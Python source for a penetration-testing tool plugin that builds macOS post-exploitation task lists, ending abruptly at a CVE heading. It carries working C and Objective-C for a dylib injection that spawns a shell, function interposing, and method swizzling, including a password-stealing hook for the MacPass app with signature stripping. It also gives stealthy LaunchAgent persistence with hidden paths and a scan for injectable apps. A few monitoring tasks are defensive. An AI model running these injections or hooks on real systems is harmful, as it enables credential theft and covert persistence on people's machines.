"""
macOS Process Abuse & Injection plugin

Generates tasks for macOS process manipulation and injection including:
- Library injection (DYLD_INSERT_LIBRARIES, dyld hijacking)
- Function hooking (interposing, method swizzling)
- Thread injection via task ports
- Electron application injection
- Language-specific injection (Java, .NET, Python, Ruby, Perl)
- Chromium injection techniques
- NIB file abuse (Dirty NIB)
- IPC abuse (XPC, Mach ports)

Extracted from HackTricks: macos-proces-abuse (21 files, 6,028 lines)
Generated by: CrackPot v1.0
Target: Post-exploitation macOS privilege escalation
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class MacOSProcessAbusePlugin(ServicePlugin):
    """macOS process injection and manipulation techniques"""

    @property
    def name(self) -> str:
        return "macos-process-abuse"

    @property
    def default_ports(self) -> List[int]:
        return []  # Post-exploitation, not port-based

    @property
    def service_names(self) -> List[str]:
        return ['macos', 'darwin', 'osx']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect macOS systems for process abuse techniques.
        Triggers on macOS-specific service fingerprints or OS detection.
        """
        service = port_info.get('service', '').lower()
        ostype = port_info.get('ostype', '').lower()
        product = port_info.get('product', '').lower()

        # Detect macOS/Darwin OS fingerprints
        if any(indicator in ostype for indicator in ['darwin', 'macos', 'mac os x']):
            return True

        # Detect macOS-specific services
        if any(svc in service for svc in ['afp', 'apple-file', 'airport']):
            return True

        # Detect macOS product signatures
        if any(prod in product for prod in ['macos', 'darwin', 'apple']):
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate macOS process abuse enumeration task tree"""

        tasks = {
            'id': 'macos-process-abuse-root',
            'name': f'macOS Process Abuse & Injection ({target})',
            'type': 'parent',
            'children': []
        }

        # CATEGORY 1: Dylib Injection
        tasks['children'].append(self._create_dylib_injection_tasks(target))

        # CATEGORY 2: Function Hooking
        tasks['children'].append(self._create_function_hooking_tasks(target))

        # CATEGORY 3: Electron Applications
        tasks['children'].append(self._create_electron_injection_tasks(target))

        # CATEGORY 4: Thread Injection
        tasks['children'].append(self._create_thread_injection_tasks(target))

        # CATEGORY 5: Language-Specific Injection
        tasks['children'].append(self._create_language_injection_tasks(target))

        # CATEGORY 6: Chromium Injection
        tasks['children'].append(self._create_chromium_injection_tasks(target))

        # CATEGORY 7: NIB File Abuse (Dirty NIB)
        tasks['children'].append(self._create_nib_abuse_tasks(target))

        # CATEGORY 8: IPC Abuse
        tasks['children'].append(self._create_ipc_abuse_tasks(target))

        # CATEGORY 9: Detection & Defense Evasion
        tasks['children'].append(self._create_detection_evasion_tasks(target))

        return tasks

    # ==================== DYLIB INJECTION ====================

    def _create_dylib_injection_tasks(self, target: str) -> Dict[str, Any]:
        """Tasks for dylib injection techniques"""
        return {
            'id': 'dylib-injection-parent',
            'name': 'Dylib Injection Techniques',
            'type': 'parent',
            'children': [
                # Task 1: DYLD_INSERT_LIBRARIES basic injection
                {
                    'id': 'dyld-insert-libraries-basic',
                    'name': 'DYLD_INSERT_LIBRARIES - Basic Injection',
                    'type': 'command',
                    'metadata': {
                        'command': 'echo \'// gcc -dynamiclib -o inject.dylib inject.c\n#include <syslog.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n__attribute__((constructor))\nvoid myconstructor(int argc, const char **argv) {\n    syslog(LOG_ERR, "[+] dylib injected in %s\\n", argv[0]);\n    printf("[+] dylib injected in %s\\n", argv[0]);\n    execv("/bin/bash", 0);\n}\' > /tmp/inject.c && gcc -dynamiclib -o /tmp/inject.dylib /tmp/inject.c',
                        'description': 'Create malicious dylib with constructor for automatic execution on load',
                        'tags': ['OSCP:HIGH', 'MACOS', 'CODE_INJECTION', 'MANUAL'],
                        'flag_explanations': {
                            '-dynamiclib': 'Compile as dynamic library (dylib)',
                            '-o inject.dylib': 'Output file name',
                            '__attribute__((constructor))': 'Function executed automatically when dylib loads (before main())',
                            'syslog(LOG_ERR)': 'Write to system log for confirmation',
                            'execv("/bin/bash", 0)': 'Spawn shell (replace with custom payload)'
                        },
                        'success_indicators': [
                            'inject.dylib created successfully',
                            'No compilation errors',
                            'File size > 0 bytes'
                        ],
                        'failure_indicators': [
                            'Compiler errors (missing headers)',
                            'Permission denied writing to /tmp',
                            'Invalid C syntax'
                        ],
                        'next_steps': [
                            'Test injection: DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /usr/bin/whoami',
                            'Monitor injection: sudo log stream --predicate \'eventMessage CONTAINS "[+] dylib"\'',
                            'Target vulnerable apps without Library Validation',
                            'Check restrictions: Apps with restricted segment, setuid/setgid blocked'
                        ],
                        'alternatives': [
                            'Manual payload in dylib: replace execv with custom shellcode',
                            'Persistence: Add to DYLD_INSERT_LIBRARIES in LaunchAgent plist',
                            'Silent injection: Remove printf/syslog, just execute payload'
                        ],
                        'notes': '''
RESTRICTIONS (macOS 10.10+):
- Blocked on setuid/setgid binaries
- Blocked on Apple binaries with restricted segment (__RESTRICT __restrict)
- Blocked on binaries with com.apple.security.cs.library-validation entitlement
- Requires target binary WITHOUT hardened runtime or with allow DYLD env vars
- System Integrity Protection (SIP) blocks many system binaries

VERIFICATION:
sudo log stream --style syslog --predicate 'eventMessage CONTAINS "[+] dylib"'

PERSISTENCE:
Add to LaunchAgent plist:
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
                        <string>/tmp/inject.dylib</string>
</dict>
                        '''
                    }
                },

                # Task 2: Dyld Hijacking via @rpath
                {
                    'id': 'dyld-hijacking-rpath',
                    'name': 'Dyld Hijacking via @rpath',
                    'type': 'command',
                    'metadata': {
                        'command': r'otool -l /Applications/TARGET.app/Contents/MacOS/TARGET | grep -A 2 "LC_RPATH\|@rpath"',
                        'description': 'Enumerate @rpath locations and missing libraries for hijacking',
                        'tags': ['OSCP:HIGH', 'MACOS', 'ENUM', 'MANUAL'],
                        'flag_explanations': {
                            'otool': 'Object file display tool (macOS equivalent of objdump)',
                            '-l': 'Display load commands (libraries, rpaths, entitlements)',
                            'grep LC_RPATH': 'Find Runtime Path load commands',
                            'grep @rpath': 'Find libraries loaded via @rpath'
                        },
                        'success_indicators': [
                            'LC_RPATH entries found with paths',
                            'Libraries using @rpath prefix',
                            'Writable @rpath locations identified'
                        ],
                        'failure_indicators': [
                            'No LC_RPATH entries (app uses absolute paths)',
                            'All @rpath locations owned by root',
                            'Library Validation enabled (check entitlements)'
                        ],
                        'next_steps': [
                            'Check library validation: codesign -dv --entitlements :- TARGET.app',
                            'Find missing libraries: compare @rpath entries with existing files',
                            'Create hijack dylib: gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -Wl,-reexport_library,LEGIT_LIB hijack.c -o hijack.dylib',
                            'Fix reexport path: install_name_tool -change @rpath/lib.dylib /full/path/to/legit/lib.dylib hijack.dylib',
                            'Copy to hijack location: cp hijack.dylib @rpath/missing_lib.dylib'
                        ],
                        'alternatives': [
                            'Manual search for apps: find /Applications -name "*.app" -exec sh -c \'codesign -dv --entitlements :- "$1" 2>&1 | grep -q "disable-library-validation" && echo "$1"\' _ {} \\;',
                            'Mass enumeration: for app in /Applications/*.app; do otool -l "$app/Contents/MacOS/"* | grep -A 2 LC_RPATH; done',
                            'Check product versions: otool -l TARGET | grep -A 3 "current version"'
                        ],
                        'notes': '''
DYLD HIJACKING PROCESS:
1. Find target with disabled library-validation entitlement
2. Identify @rpath load commands (otool -l)
3. List libraries using @rpath (otool -l | grep @rpath)
4. Find missing library in @rpath search order
5. Create malicious dylib that re-exports legit library
6. Place in first @rpath location

LIBRARY REEXPORT:
gcc -dynamiclib -current_version 1.0 \\
    -compatibility_version 1.0 \\
    -framework Foundation payload.m \\
    -Wl,-reexport_library,/path/to/legit.dylib \\
    -o hijack.dylib

VULNERABLE APPS (examples):
- Burp Suite (older versions)
- Telegram (CVE-2023-26818)
- Many Electron apps
- Third-party apps without hardened runtime

DETECTION:
- EndpointSecurity: ES_EVENT_TYPE_NOTIFY_EXEC
- Check loaded libraries: vmmap PID | grep dylib
                        '''
                    }
                },

                # Task 3: Monitor dylib injection attempts
                {
                    'id': 'dyld-monitor-injections',
                    'name': 'Monitor Dylib Injection Attempts',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo log stream --style syslog --predicate \'eventMessage CONTAINS "DYLD_INSERT_LIBRARIES" OR eventMessage CONTAINS "[+] dylib"\'',
                        'description': 'Real-time monitoring of dylib injection attempts via system logs',
                        'tags': ['OSCP:MEDIUM', 'MACOS', 'DETECTION', 'MANUAL'],
                        'flag_explanations': {
                            'log stream': 'Stream unified log in real-time',
                            '--style syslog': 'Output in syslog format (timestamp, process, message)',
                            '--predicate': 'Filter log messages matching condition',
                            'eventMessage CONTAINS': 'Search for substring in log message'
                        },
                        'success_indicators': [
                            'Log stream running successfully',
                            'Injection attempts logged with process name',
                            'Dylib load messages appear'
                        ],
                        'failure_indicators': [
                            'Permission denied (requires sudo)',
                            'No matching events (no injections occurring)',
                            'Invalid predicate syntax'
                        ],
                        'next_steps': [
                            'Identify vulnerable processes from logs',
                            'Extract PIDs for further investigation',
                            'Check process entitlements: codesign -dv --entitlements :- /proc/PID/exe',
                            'Enumerate loaded libraries: vmmap PID | grep dylib'
                        ],
                        'alternatives': [
                            'Export to file: log stream --predicate \'...\' > /tmp/injections.log',
                            'Historical search: log show --predicate \'...\' --last 1h',
                            'Process-specific: log stream --process ProcessName --predicate \'...\'',
                            'Check specific dylib: log stream --predicate \'eventMessage CONTAINS "/tmp/inject.dylib"\''
                        ],
                        'notes': '''
USEFUL PREDICATES:
- DYLD env vars: eventMessage CONTAINS "DYLD_"
- Process name: processImagePath CONTAINS "/Applications/TARGET.app"
- Library loads: eventMessage CONTAINS "dylib loaded"
- Errors: messageType == error AND eventMessage CONTAINS "dyld"

SHIELD TOOL (detection):
Open-source tool that monitors:
- DYLD_INSERT_LIBRARIES env var
- CFNETWORK_LIBRARY_PATH
- RAWCAMERA_BUNDLE_PATH
- ELECTRON_RUN_AS_NODE
- task_for_pid calls
https://github.com/theevilbit/Shield

INVESTIGATION:
1. Capture PID from log
2. Check loaded dylibs: vmmap PID | grep -v "shared cache"
3. Dump suspicious dylib: strings /path/to/suspicious.dylib
4. Check code signature: codesign -dvvv /path/to/suspicious.dylib
                        '''
                    }
                },

                # Task 4: Enumerate vulnerable applications
                {
                    'id': 'dyld-enumerate-vulnerable-apps',
                    'name': 'Enumerate Apps Without Library Validation',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /Applications -maxdepth 3 -name "*.app" 2>/dev/null | while read app; do binary=$(find "$app/Contents/MacOS" -type f -perm +111 -maxdepth 1 2>/dev/null | head -1); [ -n "$binary" ] && codesign -dv --entitlements :- "$binary" 2>&1 | grep -q "disable-library-validation" && echo "[VULN] $app"; done',
                        'description': 'Find applications vulnerable to dylib hijacking (disabled library validation)',
                        'tags': ['OSCP:HIGH', 'MACOS', 'ENUM', 'AUTOMATED'],
                        'flag_explanations': {
                            'find /Applications -maxdepth 3': 'Search Applications folder up to 3 levels deep',
                            '-name "*.app"': 'Find application bundles',
                            'find "$app/Contents/MacOS" -type f -perm +111': 'Find executable binaries',
                            'codesign -dv --entitlements :-': 'Display entitlements embedded in binary',
                            'grep -q "disable-library-validation"': 'Check for vulnerable entitlement'
                        },
                        'success_indicators': [
                            '[VULN] prefix showing vulnerable apps',
                            'Application bundle paths displayed',
                            'At least one vulnerable app found'
                        ],
                        'failure_indicators': [
                            'Permission denied on system folders',
                            'No vulnerable apps found',
                            'codesign command not found'
                        ],
                        'next_steps': [
                            'For each vulnerable app, check @rpath: otool -l BINARY | grep LC_RPATH -A 2',
                            'List libraries using @rpath: otool -l BINARY | grep @rpath -A 3',
                            'Find writable paths: ls -la "@rpath_location"',
                            'Compile hijack dylib matching version requirements',
                            'Test injection: DYLD_PRINT_LIBRARIES=1 APP.app'
                        ],
                        'alternatives': [
                            'Check specific app: codesign -dv --entitlements :- /Applications/TARGET.app/Contents/MacOS/TARGET',
                            'Search user-installed apps: find ~/Applications -name "*.app"',
                            'Find apps with specific framework: find /Applications -name "*.app" -exec sh -c \'strings "$1/Contents/MacOS/"* | grep -q "Electron" && echo "$1"\' _ {} \\;'
                        ],
                        'notes': '''
COM.APPLE.SECURITY.CS.DISABLE-LIBRARY-VALIDATION:
This entitlement allows loading unsigned/third-party dylibs.
Without it, only Apple-signed or same-developer dylibs can load.

COMMON VULNERABLE APPS:
- Older Electron apps (pre-2023)
- Third-party developer tools
- Apps compiled without hardened runtime
- Legacy apps (pre-macOS 10.14)

ADDITIONAL CHECKS:
1. Hardened runtime: codesign -dvvv APP | grep "runtime"
2. Library validation: codesign -dvvv APP | grep "library-validation"
3. Restricted segment: otool -l APP | grep __RESTRICT -A 2

EXPLOITATION PRIORITY:
1. Apps with TCC entitlements (camera, mic, contacts)
2. Apps running as different user
3. Apps with network access
4. Apps with helper tools (XPC services)

TIME ESTIMATE: 2-5 minutes for full /Applications scan
                        '''
                    }
                },

                # Task 5: Persistence via LaunchAgent
                {
                    'id': 'dyld-persistence-launchagent',
                    'name': 'Persistence via DYLD_INSERT_LIBRARIES in LaunchAgent',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create LaunchAgent plist with DYLD_INSERT_LIBRARIES for persistent dylib injection',
                        'tags': ['OSCP:MEDIUM', 'MACOS', 'PERSISTENCE', 'MANUAL'],
                        'alternatives': [
                            'Create plist: ~/Library/LaunchAgents/com.persistence.dyld.plist',
                            'Add EnvironmentVariables key with DYLD_INSERT_LIBRARIES',
                            'Load: launchctl load ~/Library/LaunchAgents/com.persistence.dyld.plist',
                            'Verify: launchctl list | grep com.persistence.dyld'
                        ],
                        'notes': '''
LAUNCHAGENT PLIST TEMPLATE:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.persistence.dyld</string>

    <key>ProgramArguments</key>
    <array>
        <string>/Applications/TARGET.app/Contents/MacOS/TARGET</string>
    </array>

    <key>EnvironmentVariables</key>
    <dict>
        <key>DYLD_INSERT_LIBRARIES</key>
        <string>/Users/Shared/.hidden/inject.dylib</string>
    </dict>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
</dict>
</plist>

WRITE TO: ~/Library/LaunchAgents/com.persistence.dyld.plist

LOAD:
launchctl load ~/Library/LaunchAgents/com.persistence.dyld.plist

VERIFY:
launchctl list | grep com.persistence.dyld
ps aux | grep TARGET.app

CLEANUP:
launchctl unload ~/Library/LaunchAgents/com.persistence.dyld.plist
rm ~/Library/LaunchAgents/com.persistence.dyld.plist

STEALTH:
- Hide dylib in system-looking location
- Use random or system-mimicking label
- Set RunAtLoad to false, trigger manually
- Use SuccessfulExit keepalive for auto-restart
                        '''
                    }
                }
            ]
        }

    # ==================== FUNCTION HOOKING ====================

    def _create_function_hooking_tasks(self, target: str) -> Dict[str, Any]:
        """Tasks for function interposing and method swizzling"""
        return {
            'id': 'function-hooking-parent',
            'name': 'Function Hooking & Method Swizzling',
            'type': 'parent',
            'children': [
                # Task 1: Function Interposing
                {
                    'id': 'function-interpose-basic',
                    'name': 'Function Interposing via __interpose',
                    'type': 'command',
                    'metadata': {
                        'command': 'echo \'// gcc -dynamiclib interpose.c -o interpose.dylib\n#include <stdio.h>\n#include <stdarg.h>\nint my_printf(const char *format, ...) {\n    return printf("HOOKED: %s\\n", format);\n}\n__attribute__((used)) static struct {\n    const void *replacement;\n    const void *replacee;\n} _interpose_printf __attribute__ ((section ("__DATA,__interpose"))) = {\n    (const void *)(unsigned long)&my_printf,\n    (const void *)(unsigned long)&printf\n};\' > /tmp/interpose.c && gcc -dynamiclib /tmp/interpose.c -o /tmp/interpose.dylib',
                        'description': 'Create dylib with __interpose section to hook libc functions',
                        'tags': ['OSCP:HIGH', 'MACOS', 'CODE_INJECTION', 'MANUAL'],
                        'flag_explanations': {
                            '__attribute__ ((section ("__DATA,__interpose")))': 'Place in __interpose section for automatic hooking by dyld',
                            'struct { replacement; replacee; }': 'Tuple of function pointers: new -> original',
                            '(const void *)(unsigned long)': 'Cast function pointer to void* for struct',
                            'DYLD_INSERT_LIBRARIES': 'Inject interpose dylib before main() loads'
                        },
                        'success_indicators': [
                            'interpose.dylib compiled successfully',
                            'Test: DYLD_INSERT_LIBRARIES=interpose.dylib /bin/echo shows "HOOKED:"',
                            'Original functionality preserved'
                        ],
                        'failure_indicators': [
                            'Section attribute syntax error',
                            'Function signature mismatch',
                            'Interposing not triggered (wrong load order)'
                        ],
                        'next_steps': [
                            'Test interposition: DYLD_INSERT_LIBRARIES=/tmp/interpose.dylib /usr/bin/printf "test"',
                            'Debug: DYLD_PRINT_INTERPOSTING=1 to see interpose activity',
                            'Hook multiple functions with additional tuples',
                            'Target app-specific functions from Framework headers'
                        ],
                        'alternatives': [
                            'Macro approach: #define DYLD_INTERPOSE(_replacement, _replacee) ...',
                            'Hook system calls: interpose open(), read(), write()',
                            'Hook Objective-C methods: interpose objc_msgSend variations',
                            'Call original: Store function pointer before interposing'
                        ],
                        'notes': '''
INTERPOSE MECHANISM:
1. dyld reads __interpose section at load time
2. Before main() executes, replaces function pointers
3. All calls to original function -> intercepted
4. Replacement can call original or modify behavior

MACRO APPROACH:
#define DYLD_INTERPOSE(_replacement, _replacee) \\
    __attribute__((used)) static struct { \\
        const void* replacement; \\
        const void* replacee; \\
    } _interpose_##_replacee \\
    __attribute__ ((section("__DATA, __interpose"))) = { \\
        (const void*)(unsigned long)&_replacement, \\
        (const void*)(unsigned long)&_replacee \\
    };

DYLD_INTERPOSE(my_printf, printf);

RESTRICTIONS:
- Only works with functions in process, not shared cache
- Requires DYLD_INSERT_LIBRARIES (restricted on protected binaries)
- Cannot interpose inline functions or direct address calls

DEBUGGING:
DYLD_PRINT_INTERPOSTING=1 shows which functions are interposed

STEALTH:
- Minimize function changes (call original after logging)
- No output to stdout (use syslog or file)
- Match original function signatures exactly
                        '''
                    }
                },

                # Task 2: Method Swizzling (Objective-C)
                {
                    'id': 'method-swizzling-objc',
                    'name': 'Objective-C Method Swizzling',
                    'type': 'command',
                    'metadata': {
                        'command': 'echo \'// gcc -framework Foundation swizzle.m -o swizzle.dylib -dynamiclib\n#import <Foundation/Foundation.h>\n#import <objc/runtime.h>\nstatic IMP original_method = NULL;\n@interface NSString (Swizzle)\n- (NSString *)swizzled_substringFromIndex:(NSUInteger)from;\n@end\n@implementation NSString (Swizzle)\n- (NSString *)swizzled_substringFromIndex:(NSUInteger)from {\n    NSLog(@"[HOOK] substringFromIndex: %lu", (unsigned long)from);\n    return ((NSString *(*)(id, SEL, NSUInteger))original_method)(self, _cmd, from);\n}\n@end\n__attribute__((constructor))\nstatic void hook_constructor() {\n    Class stringClass = [NSString class];\n    Method original = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));\n    Method swizzled = class_getInstanceMethod(stringClass, @selector(swizzled_substringFromIndex:));\n    IMP swizzled_IMP = method_getImplementation(swizzled);\n    original_method = method_setImplementation(original, swizzled_IMP);\n}\' > /tmp/swizzle.m',
                        'description': 'Hook Objective-C methods using runtime method swizzling',
                        'tags': ['OSCP:HIGH', 'MACOS', 'CODE_INJECTION', 'MANUAL'],
                        'flag_explanations': {
                            'class_getInstanceMethod': 'Get Method object for instance method selector',
                            'method_getImplementation': 'Extract IMP (function pointer) from Method',
                            'method_setImplementation': 'Replace method implementation, returns old IMP',
                            '@selector()': 'Get SEL (method selector) from method name',
                            '__attribute__((constructor))': 'Run before main() when dylib loads'
                        },
                        'success_indicators': [
                            'swizzle.m compiled without errors',
                            'Injection shows "[HOOK]" messages in logs',
                            'Original method still functional'
                        ],
                        'failure_indicators': [
                            'Method not found (check class/selector names)',
                            'Swizzling executed after method already called',
                            'Signature mismatch causing crashes'
                        ],
                        'next_steps': [
                            'Compile: gcc -framework Foundation swizzle.m -o swizzle.dylib -dynamiclib',
                            'Inject: DYLD_INSERT_LIBRARIES=/tmp/swizzle.dylib TARGET_APP',
                            'Monitor: log stream --predicate \'eventMessage CONTAINS "[HOOK]"\'',
                            'Target security-sensitive methods: setPassword:, authWithCredentials:, etc.'
                        ],
                        'alternatives': [
                            'Method exchange: method_exchangeImplementations(original, swizzled)',
                            'Runtime class dump: class-dump TARGET.app/Contents/MacOS/TARGET',
                            'Find methods: otool -ov TARGET | grep "method name"',
                            'Hook categories: Swizzle methods added via category'
                        ],
                        'notes': '''
METHOD SWIZZLING TECHNIQUES:

1. method_setImplementation (RECOMMENDED):
   - Replaces IMP of method A with IMP of method B
   - Returns original IMP for storage
   - Original can be called via function pointer

2. method_exchangeImplementations:
   - Swaps IMPs of two methods
   - Calling swizzled -> calls original's IMP
   - Calling original -> calls swizzled's IMP

MACPASS CREDENTIAL STEAL EXAMPLE:
static IMP real_setPassword = NULL;
static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL) {
    NSLog(@"[+] Password is: %@", password);
    return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd, password, keyFileURL);
}

__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
    Class classMPDocument = NSClassFromString(@"MPDocument");
    Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));
    IMP fake_IMP = (IMP)custom_setPassword;
    real_setPassword = method_setImplementation(real_Method, fake_IMP);
}

INJECT:
Strip signature: codesign --remove-signature MacPass.app
Add to Info.plist:
<key>LSEnvironment</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/Applications/MacPass.app/Contents/malicious.dylib</string>
</dict>

Re-register:
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/MacPass.app

LIMITATIONS (macOS 11+):
- Stripping signature prevents execution on newer macOS
- Must target unsigned or self-signed apps
- Gatekeeper blocks previously-executed apps with changed signature
                        '''
                    }
                },

                # Task 3: Dynamic Interposing
                {
                    'id': 'dynamic-interpose-runtime',
                    'name': 'Dynamic Interposing at Runtime',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use dyld_dynamic_interpose() to hook functions programmatically at runtime',
                        'tags': ['OSCP:MEDIUM', 'MACOS', 'CODE_INJECTION', 'MANUAL'],
                        'alternatives': [
                            'Get dyld handle: void* dyld_handle = dlopen("/usr/lib/system/libdyld.dylib", RTLD_LAZY);',
                            'Get interpose function: dyld_dynamic_interpose_t dyld_interpose = (dyld_dynamic_interpose_t)dlsym(dyld_handle, "dyld_dynamic_interpose");',
                            'Create tuple: struct dyld_interpose_tuple tuple = { replacement_func, original_func };',
                            'Call: dyld_interpose(mach_header, &tuple, 1);'
                        ],
                        'notes': '''
DYNAMIC INTERPOSE API:
struct dyld_interpose_tuple {
    const void* replacement;
    const void* replacee;
};

extern void dyld_dynamic_interpose(
    const struct mach_header* mh,
    const struct dyld_interpose_tuple array[],
    size_t count
);

EXAMPLE:
#include <dlfcn.h>
#include <stdio.h>

typedef void (*dyld_dynamic_interpose_t)(const struct mach_header*,
                                         const struct dyld_interpose_tuple[],
                                         size_t);

int my_puts(const char *str) {
    return printf("[HOOKED] %s\n", str);
}

void hook_at_runtime() {
    void* dyld = dlopen("/usr/lib/system/libdyld.dylib", RTLD_LAZY);
    dyld_dynamic_interpose_t dyld_interpose =
        (dyld_dynamic_interpose_t)dlsym(dyld, "dyld_dynamic_interpose");

    struct dyld_interpose_tuple tuple = {
        .replacement = (void*)&my_puts,
        .replacee = (void*)&puts
    };

    // Get mach_header of current image
    const struct mach_header* mh = _dyld_get_image_header(0);

    dyld_interpose(mh, &tuple, 1);

    // Now all puts() calls -> my_puts()
}

ADVANTAGES:
- No __interpose section needed
- Can hook/unhook at arbitrary times
- No need for DYLD_INSERT_LIBRARIES

DISADVANTAGES:
- Requires code execution in target
- Only affects future calls, not past
- More complex setup

USE CASES:
- Hooking from injected thread
- Conditional hooking based on runtime state
- Temporary hooks for specific operations
                        '''
                    }
                },

                # Task 4: Enumerate hookable methods
                {
                    'id': 'enumerate-objc-methods',
                    'name': 'Enumerate Objective-C Methods for Hooking',
                    'type': 'command',
                    'metadata': {
                        'command': 'class-dump /Applications/TARGET.app/Contents/MacOS/TARGET 2>/dev/null | grep -E "^[-+].*;" | head -50',
                        'description': 'Extract method signatures from Objective-C binary for hooking targets',
                        'tags': ['OSCP:HIGH', 'MACOS', 'ENUM', 'MANUAL'],
                        'flag_explanations': {
                            'class-dump': 'Reverse engineering tool to extract ObjC class info from Mach-O',
                            '-': 'Instance method',
                            '+': 'Class method',
                            ';': 'Method signature terminator',
                            'head -50': 'Limit output to first 50 methods'
                        },
                        'success_indicators': [
                            'Method signatures displayed',
                            'Class names visible',
                            'Parameter types shown'
                        ],
                        'failure_indicators': [
                            'class-dump not installed (brew install class-dump)',
                            'Binary is Swift (not Objective-C)',
                            'Binary is stripped/obfuscated'
                        ],
                        'next_steps': [
                            r'Find sensitive methods: grep -i "password\|auth\|token\|credential"',
                            'Identify target class: grep "^@interface ClassName"',
                            'Create swizzle for method: - (void)setPassword:(NSString*)pwd;',
                            'Test method call: log stream --predicate \'subsystem == "com.apple.runtime.objc"\'',
                        ],
                        'alternatives': [
                            'Runtime introspection: class_copyMethodList() in injected code',
                            'Manual disassembly: otool -ov TARGET | grep "method name"',
                            'Hopper Disassembler: GUI for method analysis',
                            'Frida: Dynamic instrumentation without compilation'
                        ],
                        'notes': '''
CLASS-DUMP INSTALLATION:
brew install class-dump

EXAMPLE OUTPUT:
@interface MPDocument : NSDocument
- (void)setPassword:(NSString *)password keyFileURL:(NSURL *)url;
- (BOOL)saveToURL:(NSURL *)url ofType:(NSString *)type error:(NSError **)error;
+ (id)sharedInstance;
@end

HOOK TARGET SELECTION:
1. Security methods: setPassword, auth*, login, unlock
2. Network methods: sendRequest, HTTPClient, fetchData
3. File operations: writeToFile, saveToURL, loadFromPath
4. Crypto: encrypt, decrypt, hashData

SWIFT vs OBJECTIVE-C:
- Swift methods have name mangling (_$s prefix)
- class-dump only works on ObjC runtime
- Swift apps need nm TARGET or swift-demangle

FRIDA ALTERNATIVE:
frida-trace -U -f com.app.id -m "*[ClassName methodName:*]"

IMPORTANT FRAMEWORKS TO HOOK:
- Security.framework: SecKeychainItemCopyContent, SecItemCopyMatching
- Foundation: NSString, NSData, NSFileManager
- AppKit: NSWindow, NSViewController
- Custom app classes: Found via class-dump
                        '''
                    }
                }
            ]
        }

    # ==================== ELECTRON INJECTION ====================

    def _create_electron_injection_tasks(self, target: str) -> Dict[str, Any]:
        """Tasks for Electron application injection"""
        return {
            'id': 'electron-injection-parent',
            'name': 'Electron Application Injection',
            'type': 'parent',
            'children': [
                # Task 1: Check Electron Fuses
                {
                    'id': 'electron-check-fuses',
                    'name': 'Check Electron Fuses Configuration',
                    'type': 'command',
                    'metadata': {
                        'command': 'npx @electron/fuses read --app /Applications/TARGET.app 2>/dev/null || echo "Install: npm install -g @electron/fuses"',
                        'description': 'Analyze Electron security fuses to identify injection opportunities',
                        'tags': ['OSCP:HIGH', 'ELECTRON', 'ENUM', 'MANUAL'],
                        'flag_explanations': {
                            'npx @electron/fuses': 'Execute Electron fuses utility without global install',
                            'read': 'Read current fuse configuration',
                            '--app': 'Path to Electron application bundle'
                        },
                        'success_indicators': [
                            'Fuse configuration displayed',
                            'RunAsNode status shown (Enabled = vulnerable)',
                            'EnableNodeCliInspectArguments status (Enabled = vulnerable)',
                            'EnableEmbeddedAsarIntegrityValidation status (Disabled = asar modification possible)'
                        ],
                        'failure_indicators': [
                            '@electron/fuses not installed',
                            'Not an Electron app',
                            'Fuses all hardened (Disabled/Enabled for security features)'
                        ],
                        'next_steps': [
                            'If RunAsNode Enabled: ELECTRON_RUN_AS_NODE=1 APP.app',
                            'If EnableNodeCliInspectArguments Enabled: APP.app --inspect=9229',
                            'If asar not protected: npx asar extract app.asar app-decomp',
                            'Check for TCC entitlements: codesign -dv --entitlements :- APP.app'
                        ],
                        'alternatives': [
                            'Manual fuse check: grep -a "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" APP.app/Contents/Frameworks/Electron\\ Framework.framework/Electron\\ Framework',
                            'Enumerate Electron apps: find /Applications -name "*.app" -exec sh -c \'strings "$1/Contents/MacOS/"* | grep -q "Electron" && echo "$1"\' _ {} \\;',
                            'Check Node version: strings APP.app/Contents/Frameworks/Electron\\ Framework.framework/Electron\\ Framework | grep "node/"'
                        ],
                        'notes': '''
ELECTRON FUSES (Security Flags):

VULNERABLE if ENABLED:
- RunAsNode: Allows ELECTRON_RUN_AS_NODE env var
- EnableNodeCliInspectArguments: Allows --inspect, --inspect-brk flags
- EnableNodeOptionsEnvironmentVariable: Allows NODE_OPTIONS env var

VULNERABLE if DISABLED:
- EnableEmbeddedAsarIntegrityValidation: ASAR not verified by macOS
- OnlyLoadAppFromAsar: Can load code from app/ folder instead of app.asar

EXAMPLE OUTPUT:
Fuse Version: v1
  RunAsNode is Enabled              ← VULNERABLE
  EnableCookieEncryption is Enabled
  EnableNodeOptionsEnvironmentVariable is Disabled
  EnableNodeCliInspectArguments is Enabled  ← VULNERABLE
  EnableEmbeddedAsarIntegrityValidation is Disabled  ← VULNERABLE
  OnlyLoadAppFromAsar is Disabled   ← VULNERABLE

ATTACK VECTORS:
1. ELECTRON_RUN_AS_NODE=1 -> Node.js REPL
2. --inspect flag -> Chrome DevTools remote debugging
3. Modified app.asar -> Code execution
4. NODE_OPTIONS=--require payload.js -> Auto-load malicious code

CVE-2024-23738 through CVE-2024-23743 (2024):
